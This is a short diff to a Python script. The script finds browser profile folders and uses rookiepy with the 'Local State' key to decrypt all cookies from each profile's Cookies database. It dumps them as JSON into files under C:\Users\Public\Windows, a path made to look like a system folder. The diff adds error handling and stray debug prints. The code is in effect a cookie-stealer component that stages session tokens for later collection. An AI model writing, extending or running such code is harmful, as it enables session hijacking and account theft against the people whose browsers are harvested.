@@ -44,20 +44,23 @@ def detect_folders(base_dir):
         if os.path.isdir(folder_path) and is_eligible_folder(folder_path, folder_name):
             detected_folders.append(folder_name)
     return detected_folders
-
 def main():
-    detected_folders = detect_folders(BASE_DIR)
-    for profile in detected_folders:
-        print(profile)
-        db_path = Path(BASE_DIR) / profile / "Network" / "Cookies"
-        print(db_path)
-        key_path = Path(BASE_DIR) / "Local State"
-        print(key_path)
-        cookies = rookiepy.any_browser(db_path=str(db_path), key_path=str(key_path), domains=None)
-        output_file = f"C:\\Users\\Public\\Windows\\ck_{profile}.txt"  # Adjusted to use profile
-        with open(output_file, "w") as file:
-            json.dump(cookies, file, indent=4)
-        print(f"Cookies written to {output_file}")
+    try:
+        detected_folders = detect_folders(BASE_DIR)
+        for profile in detected_folders:
+            db_path = Path(BASE_DIR) / profile / "Network" / "Cookies"
+            key_path = Path(BASE_DIR) / "Local State"
+            print(db_path)
+            print(key_path)
+            print("me")
+            cookies = rookiepy.any_browser(db_path=str(db_path), key_path=str(key_path), domains=None)
+            output_file = f"C:\\Users\\Public\\Windows\\ck_{profile}.txt"  # Adjusted to use profile
+            print("  ow")
+            with open(output_file, "w") as file:
+                json.dump(cookies, file, indent=4)
+            print(f"Cookies written to {output_file}")
+    except Exception as e:
+        print(f"An error occurred: {e}")
 
 if __name__ == "__main__":
     main()
